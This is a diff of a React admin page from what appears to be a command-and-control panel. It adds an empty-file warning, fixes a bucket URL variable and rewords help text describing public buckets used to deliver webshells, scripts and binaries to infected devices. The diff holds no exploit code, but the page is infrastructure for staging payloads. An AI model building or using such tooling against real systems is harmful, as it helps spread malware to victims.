@@ -81,7 +81,10 @@ export const AdminDelivery = () => {
   },[page])
 
   const handleUpload = async () => {
-    if (!file) return;
+    if (!file){
+      toast.error("Empty file")
+      return;
+    } 
 
     try {
       setOnSending(true);
@@ -252,9 +255,9 @@ export const AdminDelivery = () => {
       <h3>Bucket</h3>
       <h4>{import.meta.env.VITE_API_URL_BUCKETS}{page}/</h4>
       <p>
-        Upload files into c2c bucket with the purpose of deliver files to infected devices, this files can be webshells, bash and powershell scripts, binaries, etc.
-        But be careful, all buckets can be accesed by everybody, do not upload sensitive information.
-        You can use the link of each file to deliver them. Happy hacking
+      Upload files to the public buckets to deliver files to infected devices. These files can include webshells, bash or powershell scripts, binaries, and more.
+      Important: All buckets are publicly accessible, so do not upload any sensitive or confidential information.
+      Once uploaded, you can use the file’s link to distribute it as needed, this buckets are also usefull for fetching payloads.
       </p>
       <div className="delivery-form-section">
         
@@ -286,7 +289,7 @@ export const AdminDelivery = () => {
               :
               
               artifacts.map((ar)=><li className='art-file-li'>
-                <Link target='blank' style={{ textDecoration: 'none', backgroundColor:'transparent', height:'100%'}} to={`${import.meta.env.VITE_API_BUCKET_URL}${page}/${ar}`}>📄{ar}</Link> 
+                <Link target='blank' style={{ textDecoration: 'none', backgroundColor:'transparent', height:'100%'}} to={`${import.meta.env.VITE_API_URL_BUCKETS}${page}/${ar}`}>📄{ar}</Link> 
                 
                 {user?.role === "admin" &&
                   <button className='delivery-delete-art' onClick={()=> delete_artifact(ar)}>Delete</button>
@@ -344,6 +347,7 @@ export const AdminDelivery = () => {
 
       />
       <ToastContainer
+        style={{backgroundColor:"transparent"}}
         position="top-center"
         autoClose={4000}
         hideProgressBar={true}
@@ -353,7 +357,7 @@ export const AdminDelivery = () => {
         draggable
         pauseOnHover
         theme="dark"
-      />
+        />    
 
     </div>
   );
